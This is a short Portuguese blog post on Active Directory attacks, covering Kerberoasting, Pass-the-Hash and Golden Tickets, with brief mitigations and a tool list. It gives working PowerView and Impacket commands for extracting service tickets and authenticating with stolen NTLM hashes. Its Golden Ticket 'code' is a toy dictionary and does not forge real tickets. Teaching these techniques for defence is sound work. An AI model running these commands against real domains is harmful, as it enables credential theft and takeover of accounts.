---
title: "Advanced Exploitation Techniques"
excerpt: "Deep dive into advanced Active Directory exploitation techniques and mitigation strategies..."
image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80"
tags: ["Active Directory", "Exploitation"]
author: "lucas"
date: "2024-01-23"
---

# Advanced Active Directory Exploitation

Neste post, vamos explorar técnicas avançadas de exploração do Active Directory e como se proteger contra elas.

## Kerberoasting Attack

O Kerberoasting é uma técnica que explora o protocolo Kerberos para obter credenciais:

\`\`\`powershell

# Exemplo de comando para extrair tickets

Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat
\`\`\`

## Pass-the-Hash

Uma técnica clássica que permite reutilizar hashes NTLM:

\`\`\`bash

# Usando o Impacket para PtH

impacket-psexec DOMAIN/Administrator@TARGET -hashes :HASH
\`\`\`

## Golden Ticket Attack

O ataque Golden Ticket é um dos mais poderosos:

\`\`\`python

# Exemplo de código para criar um Golden Ticket

def create_golden_ticket(domain_sid, krbtgt_hash):
ticket = {
'domain_sid': domain_sid,
'krbtgt_hash': krbtgt_hash,
'user_id': 500, # Admin
'groups': [512, 513, 518, 519] # Domain Admin groups
}
return ticket
\`\`\`

## Mitigação

Para se proteger contra esses ataques:

1. Implementar PAM (Privileged Access Management)
2. Usar autenticação multi-fator
3. Monitorar eventos suspeitos
4. Realizar auditorias regulares

## Ferramentas Úteis

- BloodHound para mapeamento
- Mimikatz para extração de credenciais
- PowerView para enumeração
- CrackMapExec para testes

## Conclusão

A segurança do Active Directory é crítica e requer atenção constante. Mantenha-se atualizado com as últimas técnicas e implemente as melhores práticas de segurança.
